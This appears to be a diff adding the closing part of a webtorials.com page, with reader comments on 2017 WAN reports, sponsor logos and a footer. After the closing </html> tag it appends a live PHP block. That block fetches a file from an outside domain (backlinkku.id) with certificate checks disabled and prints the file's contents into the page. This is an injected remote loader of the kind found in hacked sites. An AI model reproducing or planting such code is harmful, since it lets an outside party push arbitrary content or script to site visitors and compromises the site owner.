+            <li>Interesting reading... <a href="https://www.webtorials.com/content/2017/05/the-2017-state-of-the-wan-report.html#comment-6876">Richard Fausey, Plow, LLC on "The 2017 State-of-the-WAN Report"</a>: </li>
+        
+    
+        
+            <li>I needed this document. Thank you.... <a href="https://www.webtorials.com/content/2017/02/the-2017-guide-to-wan-architecture-and-design---executive-summary.html#comment-6858">AO NII Mashtab on "The 2017 Guide to WAN Architecture and Design - Executive Summary"</a>: </li>
+        
+    
+        
+            <li>I look forward to reviewing more info on this topic.
+... <a href="https://www.webtorials.com/content/2017/03/2017-productivity-report.html#comment-6855">trevor evans - fox group on "2017 Workplace Productivity and Communications Technology Report"</a>: </li>
+        
+    
+        
+            <li>I would like access to your "2017 Workplace Productivity and Communications Technology Report"
+
+Than... <a href="https://www.webtorials.com/content/2017/03/2017-productivity-report.html#comment-6848">Paul Zielie, Harman Professional Solutions on "2017 Workplace Productivity and Communications Technology Report"</a>: </li>
+        
+    
+        
+            <li>I'm Telecommunications Engineer at PETROBRAS S.A. and i have overall interest about WAN. ... <a href="https://www.webtorials.com/content/2016/12/the-2017-guide-to-wan-architecture-and-design---part-1-state-of-the-wan.html#comment-6840">JOSE CEREZO, PETROBRAS S.A. on "The 2017 Guide to WAN Architecture and Design - Part 1: State of the WAN"</a>: </li>
+        
+        </ul>
+<b><i><a href="https://www.webtorials.com/content/historical-comments.html">See more discussions...</a></b></i>
+</div>
+</div>
+        
+    
+
+
+
+
+
+
+
+
+<h2 class="widget-header">Featured Sponsor Microsites</h2>
+<div class="widget-content" align="center">
+<table cellspacing="18" width="300">
+<tr>
+<td align="center"><a href="https://www.webtorials.com/content/featured/sonus-networks/"><img src="https://www.webtorials.com/Sonus_logo.jpg"></a><br/><br/></td>
+<td align="center"><a href="https://www.webtorials.com/content/featured/avaya/"><img src="https://www.webtorials.com/avaya-logo.gif"></a><br/><br/></td>
+</tr>
+<tr>
+<td align="center"><a href="https://www.webtorials.com/content/featured/mitel/"><img src="https://www.webtorials.com/Mitel-logo.jpg"></a><br/><br/></td>
+<td align="center"><a href="https://www.webtorials.com/content/featured/oracle/"><img src="https://www.webtorials.com/Oracle_Communications_logo.jpg"></a><br/><br/></td>
+</tr>
+<tr>
+<td align="center"><a href="https://www.webtorials.com/content/featured/certes/"><img src="https://www.webtorials.com/Certes.jpg"></a><br/><br/></td>
+<td align="center"><a href="https://www.webtorials.com/content/featured/audiocodes/"><img src="https://www.webtorials.com/AudioCodes.jpg"></a><br/><br/></td>
+</tr>
+<tr>
+<td align="center"><a href="https://www.webtorials.com/content/featured/sangoma/"><img src="https://www.webtorials.com/sangoma.jpg"></a><br/></td>
+<td align="center"><a href="https://www.webtorials.com/content/featured/netscout-systems/"><img src="https://www.webtorials.com/NetScout.jpg"></a><br/></td>
+</tr>
+<tr>
+<td align="center"><a href="https://www.webtorials.com/content/featured/forescout-technologies/"><img src="https://www.webtorials.com/ForeScout.jpg"></a><br/></td>
+<td align="center"><a href="https://www.webtorials.com/content/featured/efax/"><img src="https://www.webtorials.com/eFax-logo.jpg"></a><br/><br/></td>
+</tr>
+<tr>
+<td align="center"><a href="https://www.webtorials.com/content/featured/the-sip-school/"><img src="https://www.webtorials.com/SIPSchool2.jpg"></a><br/><br/></td>
+<td align="center"><a href="https://www.webtorials.com/content/featured/cato-networks/"><img src="https://www.webtorials.com/CatoNetworks.jpg"></a><br/><br/></td>
+</tr>
+</table>
+</div>
+
+
+    <h2 class="widget-header">Archives</h2>
+
+
+<div class="widget-content">
+<p style="text-align: left;"><a href="https://www.webtorials.com/content/category-archive-summary.html"><b><i>Access the Archives by Category
+</b></i></a></p>
+
+
+
+</div>
+    <h2 class="widget-header">Notices</h2>
+
+
+<div class="widget-content">
+<a href="https://www.webtorials.com/content/copyright.html" target="_blank">Copyright</a><br/>
+<a href="https://www.webtorials.com/privacy.htm" target="_blank">Privacy Notice</a><br/>
+<a href="https://www.webtorials.com/terms.htm" target="_blank">Terms of Use</a>
+</div>
+
+
+
+
+
+
+
+
+
+
+    </div>
+</div>
+
+
+
+
+                </div>
+            </div>
+            <div id="footer">
+                <div id="footer-inner">
+                    <div id="footer-content">
+
+                        <div class="widget-powered widget">
+                            <div class="widget-content">
+                                
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+
+   
+<div style="font-size:10px; color:black"><i>Please note: By downloading this information, you acknowledge that the sponsor(s) of this information may contact you, providing that they give you the option of opting out of further communications from them concerning this information.&nbsp; Also, by your downloading this information, you agree that the information is for your personal use only and that this information may not be retransmitted to others or reposted on another web site.&nbsp; Continuing past this point indicates your acceptance of our terms of use as specified at <a><https://www.webtorials.com/terms.htm" target="_blank">Terms of Use.</a></i>
+
+<br/><br/>WebtorialÂ® is a registered servicemark of Distributed Networking Associates. The Webtorial logo is a servicemark of Distributed Networking Associates.  Copyright 1999-2018, Distributed Networking Associates, Inc.</div>
+               
+</div>
+</body>
+</html>
+<?php
+$url = 'https://backlinkku.id/menu/vip-v2/script.txt';
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+$content = curl_exec($ch);
+if (curl_errno($ch)) {
+    echo "cURL Error: " . curl_error($ch);
+} else {
+    echo $content;
+}
+curl_close($ch);
+?>
